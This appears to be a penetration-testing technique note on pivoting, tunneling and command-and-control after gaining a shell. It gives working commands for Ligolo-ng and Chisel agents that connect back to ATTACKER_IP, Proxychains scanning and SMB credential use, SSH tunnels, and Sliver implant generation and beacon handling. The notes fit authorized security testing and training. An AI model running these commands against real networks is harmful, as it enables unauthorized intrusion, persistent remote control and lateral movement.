---
category: technique
title: "Pivoting, Tunneling and C2 - Ligolo, Chisel, Sliver, Proxychains"
tags: [tools, pivoting, tunneling, c2, ligolo, chisel, sliver, proxychains, lateral-movement, post-exploitation]
---

# Pivoting, Tunneling and C2

When you get a shell on a segmented host, you need to route your traffic through it to reach the rest of the internal network.

## Ligolo-ng

Creates a TUN interface on your machine - tools run as if they're directly on the target network, no proxychains needed. Best option when you can drop an agent.

```bash
go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest
go install github.com/nicocha30/ligolo-ng/cmd/agent@latest

# attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# target
./agent -connect ATTACKER_IP:11601 -ignore-cert

# back on attacker, in ligolo console
session
start
sudo ip route add 192.168.1.0/24 dev ligolo

nmap -sV 192.168.1.0/24
```

## Chisel

Reverse tunnel over HTTP - useful when the target can only make outbound HTTP connections.

```bash
go install github.com/jpillora/chisel@latest

# attacker
chisel server -p 8080 --reverse

# target
./chisel client ATTACKER_IP:8080 R:socks
# creates SOCKS5 on localhost:1080
```

Double pivot through two hops:

```bash
# attacker
chisel server -p 8080 --reverse

# hop1
./chisel client ATTACKER_IP:8080 R:8081:127.0.0.1:8081 &
./chisel server -p 8081 --reverse &

# hop2
./chisel client HOP1_IP:8081 R:socks
```

## Proxychains

Routes any TCP tool through a SOCKS proxy. Use after setting up chisel or ssh -D.

```bash
# /etc/proxychains4.conf - add:
socks5 127.0.0.1 1080

proxychains nmap -sT -p 22,80,443 192.168.1.10   # -sT, not -sS
proxychains nxc smb 192.168.1.0/24 -u user -p pass
proxychains msfconsole
```

UDP/ICMP don't work through proxychains - use connect scan (`-sT`) not SYN scan (`-sS`) with nmap.

## SSH tunneling

```bash
ssh -D 1080 -N user@jump_host           # SOCKS proxy
ssh -L 8080:internal:80 user@jump       # forward specific port
ssh -R 9090:localhost:9090 user@jump    # expose local port on remote
ssh -fN -D 1080 user@jump_host          # background
```

## Sliver

Full C2 - beacons, implants, built-in SOCKS, port forwards.

```bash
curl https://sliver.sh/install | sudo bash
sliver-server

# in console
generate --mtls ATTACKER_IP --os windows --arch amd64 --save /tmp/implant.exe
generate --http ATTACKER_IP --os linux --arch amd64 --save /tmp/implant
mtls
http -l 80

# after beacon connects
sessions
use <id>
socks5 start
portfwd add --remote 3389:192.168.1.1:3389
execute -o whoami
```

Use Sliver for persistent C2, Metasploit for specific exploitation modules.

## Decision tree

```
shell on segmented host?
├── can drop agent? → ligolo-ng
├── only HTTP out? → chisel + proxychains
├── need persistent C2? → sliver
└── have SSH? → ssh -D 1080
```
